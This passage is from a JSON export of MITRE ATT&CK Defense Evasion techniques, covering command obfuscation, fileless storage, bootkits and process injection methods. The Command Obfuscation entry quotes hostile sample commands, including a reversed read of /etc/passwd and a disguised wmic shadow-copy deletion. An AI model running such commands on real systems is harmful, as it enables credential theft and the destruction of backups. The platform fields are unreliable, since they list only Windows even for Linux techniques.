    "description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating systemâ€™slinkerwhen executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.[1][2]Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version ofAppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:36.254024"
  },
  {
    "technique_id": "T1027.009",
    "name": "Embedded Payloads",
    "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries toSubvert Trust Controlsby not impacting execution controls such as digital signatures and notarization tickets.[1]Adversaries may embed payloads in various file formats to hide payloads.[2]This is similar toSteganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.[3]For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.[4]Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.[5]Embedded content may also be used asProcess Injectionpayloads used to infect benign system processes.[6]These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.[7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:39.649949"
  },
  {
    "technique_id": "T1027.010",
    "name": "Command Obfuscation",
    "description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g.,PhishingandDrive-by Compromise) or interactively viaCommand and Scripting Interpreter.[1][2]For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,^,+.$, and%) to make commands difficult to analyze while maintaining the same intended functionality.[3]Many languages support built-in obfuscation in the form of base64 or URL encoding.[4]Adversaries may also manually implement command obfuscation via string splitting (\"Wor\"+\"d.Application\"), order and casing of characters (rev <<<'dwssap/cte/ tac'), globing (mkdir -p '/tmp/:&$NiA'), as well as various tricks involving passing strings through tokens/environment variables/input streams.[5][6]Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete).[7]Tools such asInvoke-ObfuscationandInvoke-DOSfucationhave also been used to obfuscate commands.[8][9]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:43.035074"
  },
  {
    "technique_id": "T1027.011",
    "name": "Fileless Storage",
    "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.[1][2]In Linux systems, shared memory directories such as/dev/shm,/run/shm,/var/run, and/var/lockmay also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.[3][4][5]Similar to fileless in-memory behaviors such asReflective Code LoadingandProcess Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.[6]Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part ofPersistence) and collected data not yet exfiltrated from the victim (e.g.,Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g.,%SystemRoot%\\System32\\Wbem\\Repository) or Registry (e.g.,%SystemRoot%\\System32\\Config) physical files.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:46.428332"
  },
  {
    "technique_id": "T1027.012",
    "name": "LNK Icon Smuggling",
    "description": "Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as theIconEnvironmentDataBlock) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory.Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g.,Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked byCommand and Scripting Interpreter/System Binary Proxy Executionarguments within the target path field of the LNK.[1][2]LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:49.773451"
  },
  {
    "technique_id": "T1027.013",
    "name": "Encrypted/Encoded File",
    "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such asSoftware Packing,Steganography, andEmbedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e.,Deobfuscate/Decode Files or Information) at the time of execution/use.This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.[1]Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as aPhishingpayload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g.,User Execution).[2]Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content untilCommand and Scripting Interpreterexecution.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:53.256647"
  },
  {
    "technique_id": "T1027.014",
    "name": "Polymorphic Code",
    "description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.[1]With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.[2]Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such asSoftware Packing,Command Obfuscation, orEncrypted/Encoded File.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:56.629237"
  },
  {
    "technique_id": "T1027.015",
    "name": "Compression",
    "description": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e.,Fileless Storage).[1]In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.[2]File archives may be sent as oneSpearphishing Attachmentthrough email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e.,Malicious File).[3]However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.[4]Compressionmay be used in combination withEncrypted/Encoded Filewhere compressed files are encrypted and password-protected.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:59.995883"
  },
  {
    "technique_id": "T1027.016",
    "name": "Junk Code Insertion",
    "description": "Adversaries may use junk code / dead code to obfuscate a malwareâ€™s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined withCompressionorSoftware Packing.[1][2]No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.[1]The use of junk / dead code insertion is distinct fromBinary Paddingbecause the purpose is to obfuscate the functionality of the code, rather than simply to change the malwareâ€™s signature.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:03.426797"
  },
  {
    "technique_id": "T1027.017",
    "name": "SVG Smuggling",
    "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.[1]SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include<script>tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files.SVG smuggling can take a number of forms. For example, threat actors may include content that:Assembles malicious payloads[2]Downloads malicious payloads[3]Redirects users to malicious websites[4]Displays interactive content to users, such as fake login forms and download buttons.[4]SVG Smuggling may be used in conjunction withHTML Smugglingwhere an SVG with a malicious payload is included inside an HTML file.[2]SVGs may also be included in other types of documents, such as PDFs.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:06.769873"
  },
  {
    "technique_id": "T1542",
    "name": "Pre-OS Boot",
    "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:10.101151",
    "subtechniques": [
      {
        "id": "T1542.001",
        "name": "System Firmware"
      },
      {
        "id": "T1542.002",
        "name": "Component Firmware"
      },
      {
        "id": "T1542.003",
        "name": "Bootkit"
      }
    ]
  },
  {
    "technique_id": "T1542.001",
    "name": "System Firmware",
    "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.[1][2][3]System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:13.497775"
  },
  {
    "technique_id": "T1542.002",
    "name": "Component Firmware",
    "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar toSystem Firmwarebut conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:16.830133"
  },
  {
    "technique_id": "T1542.003",
    "name": "Bootkit",
    "description": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).[1]The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.[2]The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:20.190641"
  },
  {
    "technique_id": "T1055",
    "name": "Process Injection",
    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:23.513385",
    "subtechniques": [
      {
        "id": "T1055.001",
        "name": "Dynamic-link Library Injection"
      },
      {
        "id": "T1055.002",
        "name": "Portable Executable Injection"
      },
      {
        "id": "T1055.003",
        "name": "Thread Execution Hijacking"
      },
      {
        "id": "T1055.004",
        "name": "Asynchronous Procedure Call"
      },
      {
        "id": "T1055.005",
        "name": "Thread Local Storage"
      },
      {
        "id": "T1055.011",
        "name": "Extra Window Memory Injection"
      },
      {
        "id": "T1055.012",
        "name": "Process Hollowing"
      },
      {
        "id": "T1055.013",
        "name": "Process DoppelgÃ¤nging"
      },
      {
        "id": "T1055.015",
        "name": "ListPlanting"
      }
    ]
  },
  {
    "technique_id": "T1055.001",
    "name": "Dynamic-link Library Injection",
    "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThread(which calls theLoadLibraryAPI responsible for loading the DLL).[1]Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function ofLoadLibrary).[2][1]Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module'sAddressOfEntryPointbefore starting a new thread in the target process.[3]This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:26.907913"
  },
  {
    "technique_id": "T1055.002",
    "name": "Portable Executable Injection",
    "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThreador additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:30.190206"
  },
  {
    "technique_id": "T1055.003",
    "name": "Thread Execution Hijacking",
    "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed viaSuspendThread,VirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1]This is very similar toProcess Hollowingbut targets an existing process rather than creating a process in a suspended state.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:33.463150"
  },
  {
    "technique_id": "T1055.004",
    "name": "Asynchronous Procedure Call",
    "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.APC injection is commonly performed by attaching malicious code to the APC Queue[1]of a process's thread. Queued APC functions are executed when the thread enters an alterable state.[1]A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this pointQueueUserAPCcan be used to invoke a function (such asLoadLibrayApointing to a malicious DLL).A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.[2]AtomBombing[3]is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:36.737246"
  },
  {
    "technique_id": "T1055.005",
    "name": "Thread Local Storage",
    "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a processâ€™ memory space using otherProcess Injectiontechniques such asProcess Hollowing.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:40.089265"
  },
  {
    "technique_id": "T1055.011",
    "name": "Extra Window Memory Injection",
    "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).[1]Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.[2][3]Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the processâ€™s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the processâ€™s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such asWriteProcessMemoryandCreateRemoteThread.[4]More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.[5][6]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:43.355064"
  },
  {
    "technique_id": "T1055.012",
    "name": "Process Hollowing",
    "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such asCreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such asZwUnmapViewOfSectionorNtUnmapViewOfSectionbefore being written to, realigned to the injected code, and resumed viaVirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1][2]This is very similar toThread Local Storagebut creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:46.643273"
  },
  {
    "technique_id": "T1055.013",
    "name": "Process DoppelgÃ¤nging",
    "description": "Adversaries may inject malicious code into process via process doppelgÃ¤nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgÃ¤nging is a method of executing arbitrary code in the address space of a separate live process.Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.[1]To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.[2]To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.[3]Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.[4]Adversaries may abuse TxF to a perform a file-less variation ofProcess Injection. Similar toProcess Hollowing, process doppelgÃ¤nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgÃ¤nging's use of TxF also avoids the use of highly-monitored API functions such asNtUnmapViewOfSection,VirtualProtectEx, andSetThreadContext.[4]Process DoppelgÃ¤nging is implemented in 4 steps[4]:Transact â€“ Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.Load â€“ Create a shared section of memory and load the malicious executable.Rollback â€“ Undo changes to original executable, effectively removing malicious code from the file system.Animate â€“ Create a process from the tainted section of memory and initiate execution.This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgÃ¤nging may evade detection from security products since the execution is masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:11:49.886801"
  },
  {
    "technique_id": "T1055.015",
    "name": "ListPlanting",
    "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process.[1]Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.List-view controls are user interface windows used to display collections of items.[2]Information about an application's list-view settings are stored within the process' memory in aSysListView32control.ListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.[3]Adversaries must first copy code into the target processâ€™ memory space, which can be performed various ways including by directly obtaining a handle to theSysListView32child of the victim process window (via Windows API calls such asFindWindowand/orEnumWindows) or otherProcess Injectionmethods.Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitoredWriteProcessMemoryfunction. For example, an adversary can use thePostMessageand/orSendMessageAPI functions to sendLVM_SETITEMPOSITIONandLVM_GETITEMPOSITIONmessages, effectively copying a payload 2 bytes at a time to the allocated memory.[4]Finally, the payload is triggered by sending theLVM_SORTITEMSmessage to theSysListView32child of the process window, with the payload within the newly allocated buffer passed and executed as theListView_SortItemscallback.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Process Injection",
    "parent_technique_id": "T1055",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
